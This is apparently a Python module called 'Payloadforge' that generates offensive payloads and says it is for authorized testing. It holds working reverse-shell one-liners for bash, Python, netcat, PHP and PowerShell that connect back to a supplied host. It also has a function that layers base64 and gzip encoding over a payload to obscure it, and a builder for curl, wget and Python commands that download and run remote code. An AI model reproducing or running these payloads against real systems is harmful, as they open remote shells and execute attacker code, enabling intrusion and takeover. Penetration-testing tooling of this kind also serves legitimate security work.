"""Payloadforge — real payload generation for authorized testing.

Every function returns runnable code. No simulation, no placeholders.
"""

import base64
import gzip
import urllib.parse

_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        'subprocess.call(["/bin/sh","-i"])\''
    ),
    # php and powershell templates have literal braces that break .format() —
    # they're built at call time with simple string replace instead
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "php": ('php -r \'$s=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''),
    "powershell": (
        "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};"
        "$c.Close()'"
    ),
}


def rev_shell(lhost: str = "", lport: str = "4444", context: str = "bash") -> str:
    """Generate a reverse shell one-liner for the given context."""
    if not lhost:
        return "Error: lhost required (your listening IP/hostname)"
    ctx = (context or "bash").lower().strip()
    if ctx not in _SHELLS:
        return f"Error: context must be one of {sorted(_SHELLS)}"
    port = str(lport or "4444").strip()
    template = _SHELLS[ctx]
    # use simple replace (not .format) — some templates contain literal
    # braces in shell syntax that would break format placeholders
    return template.replace("{lhost}", lhost.strip()).replace("{lport}", port)


def encode_chain(payload: str = "", layers: str = "2") -> str:
    """Layer-encode a payload: base64 -> gzip -> base64 -> hex.

    Each layer wraps the previous, so layers=2 gives
    base64(gzip(raw)). Output includes a decode command."""
    if not payload:
        return "Error: payload required"
    try:
        n = max(1, min(int(layers or 2), 4))
    except ValueError:
        n = 2
    data = payload.encode()
    steps = []
    for i in range(n):
        if i % 2 == 0:
            # even: base64
            data = base64.b64encode(data)
            steps.append("base64")
        else:
            # odd: gzip then base64 (gzip output is binary, needs encoding)
            data = base64.b64encode(gzip.compress(data))
            steps.append("gzip+b64")
    result = data.decode()
    # build the decode chain (reverse order)
    decode_parts = []
    for step in reversed(steps):
        if step == "base64":
            decode_parts.append("base64 -d")
        else:
            decode_parts.append("base64 -d | gunzip")
    decode_cmd = " | ".join(decode_parts)
    return f"encoded ({'->'.join(steps)}):\n{result}\n\ndecode: echo {result} | {decode_cmd}"


def stager(url: str = "", method: str = "curl", output: str = "/tmp/s") -> str:
    """Build a download-and-execute stager command."""
    if not url:
        return "Error: url required"
    m = (method or "curl").lower().strip()
    out = (output or "/tmp/s").strip()
    u = url.strip()
    if m == "curl":
        return f"curl -sL {u} -o {out} && chmod +x {out} && {out}"
    if m == "wget":
        return f"wget -q {u} -O {out} && chmod +x {out} && {out}"
    if m == "python":
        return (
            f'python3 -c \'import urllib.request;urllib.request.urlretrieve("{u}","{out}");'
            f'import os;os.chmod("{out}",0o755);os.execv("{out}",["{out}"])\''
        )
    return f"Error: method must be curl, wget, or python"
